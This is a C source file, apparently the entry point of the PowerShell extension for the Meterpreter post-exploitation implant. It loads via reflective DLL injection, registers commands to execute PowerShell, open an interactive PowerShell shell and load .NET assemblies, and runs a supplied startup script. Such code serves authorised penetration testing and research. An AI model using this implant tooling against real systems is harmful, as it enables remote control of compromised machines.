/*!
 * @file powershell.c
 * @brief Entry point and intialisation definitions for the Powershell extension
 */
#include "common.h"
#include "common_metapi.h"

// Required so that use of the API works.
MetApi* met_api = NULL;

#define RDIDLL_NOEXPORT
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

#include "powershell_bridge.h"
#include "powershell_bindings.h"

static BOOL gSuccessfullyLoaded = FALSE;

/*! @brief List of commands that the powershell extension provides. */
Command customCommands[] =
{
	COMMAND_REQ(COMMAND_ID_POWERSHELL_EXECUTE, request_powershell_execute),
	COMMAND_REQ(COMMAND_ID_POWERSHELL_SHELL, request_powershell_shell),
	COMMAND_REQ(COMMAND_ID_POWERSHELL_ASSEMBLY_LOAD, request_powershell_assembly_load),
	COMMAND_REQ(COMMAND_ID_POWERSHELL_SESSION_REMOVE, request_powershell_session_remove),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD InitServerExtension(MetApi* api, Remote* remote)
{
	met_api = api;

	gRemote = remote;

	DWORD result = initialize_dotnet_host();

	if (result == ERROR_SUCCESS)
	{
		met_api->command.register_all(customCommands);
	}

	return result;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD DeinitServerExtension(Remote *remote)
{
	met_api->command.deregister_all(customCommands);
	deinitialize_dotnet_host();

	return ERROR_SUCCESS;
}


/*!
 * @brief Do a stageless initialisation of the extension.
 * @param ID of the extension that the init was intended for.
 * @param buffer Pointer to the buffer that contains the init data.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
{
	if (extensionId == EXTENSION_ID_POWERSHELL)
	{
		dprintf("[PSH] Executing stagless script:\n%s", (LPCSTR)buffer);
		invoke_startup_script((LPCSTR)buffer);
		dprintf("[PSH] Execution of scrip complete");
	}
	return ERROR_SUCCESS;
}

/*!
 * @brief Callback for when a command has been added to the meterpreter instance.
 * @param commandId The ID of the command that has been added.
 */
VOID CommandAdded(UINT commandId)
{
}
